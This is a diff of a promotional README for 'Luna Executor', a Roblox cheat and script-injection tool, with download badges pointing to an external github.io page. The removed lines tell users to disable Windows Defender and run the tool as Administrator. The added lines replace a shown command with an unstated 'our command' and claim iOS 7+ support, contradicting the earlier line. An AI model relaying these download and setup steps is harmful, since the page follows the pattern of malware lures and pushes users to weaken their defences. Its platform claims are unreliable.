@@ -71,11 +71,10 @@ Luna executor distinguishes itself from alternatives like Synapse X, KRNL, and F
 
 1. **Download** the latest luna executor package from the official repository
 2. **Extract** the ZIP file to a dedicated folder (e.g., `C:\LunaExecutor`)
-3. **Disable** Windows Defender temporarily (add folder to exclusions)
-4. **Run** `LunaExecutor.exe` as Administrator
-5. **Launch** Roblox and join any game
-6. **Click** the "Inject" button in luna executor
-7. **Load** your script and press "Execute"
+3. **Run** `LunaExecutor.exe` as Administrator
+4. **Launch** Roblox and join any game
+5. **Click** the "Inject" button in luna executor
+6. **Load** your script and press "Execute"
 
 
 [![Download Luna Executor](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge&logo=github)](https://luna-execs.github.io/luna/)
@@ -84,7 +83,7 @@ Luna executor distinguishes itself from alternatives like Synapse X, KRNL, and F
 
 1. **Download** the macOS-compatible version
 2. **Open** Terminal and navigate to the download location
-3. **Run** `chmod +x LunaExecutor.app` to grant permissions
+3. **Run** our command to grant permissions
 4. **Launch** the application and follow on-screen instructions
 5. **Inject** into Roblox using the automated injection tool
 
@@ -109,10 +108,10 @@ Luna executor distinguishes itself from alternatives like Synapse X, KRNL, and F
 | Platform | Status | Minimum Version | Notes |
 |----------|--------|-----------------|-------|
 | Windows 10/11 | ✅ Fully Supported | Build 19041+ | Recommended platform |
-| macOS | ✅ Supported | 10.15 Catalina+ | Limited script library |
+| macOS | ✅ Supported | 10.15 Catalina+ | Best |
 | Linux | ⚠️ Experimental | Ubuntu 20.04+ | Requires Wine compatibility layer |
 | Android | ✅ Supported | Android 8.0+ | Mobile-optimized interface |
-| iOS | ❌ Not Supported | N/A | Apple restrictions prevent execution |
+| iOS | ✅ Supported | iOS 7+ | .IPA install |
 | Roblox Version | ✅ Compatible | Latest stable | Auto-updates with Roblox patches |
 
 ***
@@ -180,7 +179,7 @@ We release updates weekly to address Roblox patches, add new features, and impro
 
 ## 🎯 Conclusion
 
-Luna executor represents the perfect balance between power and accessibility in the Roblox scripting ecosystem. With its comprehensive feature set, active development cycle, and supportive community, it's the ideal choice for anyone looking to enhance their Roblox experience through custom scripts.
+Luna Executor represents the perfect balance between power and accessibility in the Roblox scripting ecosystem. With its comprehensive feature set, active development cycle, and supportive community, it's the ideal choice for anyone looking to enhance their Roblox experience through custom scripts.
 
 Whether you're automating tedious farming tasks, testing creative game modifications, or learning Lua programming, luna executor provides the reliable foundation you need. Join our growing community of 500,000+ users and discover what's possible when you take control of your gameplay.
 
@@ -193,7 +192,7 @@ Whether you're automating tedious farming tasks, testing creative game modificat
 [![Download Luna Executor](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge&logo=github)](https://luna-execs.github.io/luna/)
 
 
-*Version 2.4.1 | Updated March 2026*
+*Version 2.4.1 | Updated April 2026*
 
 </div>
 
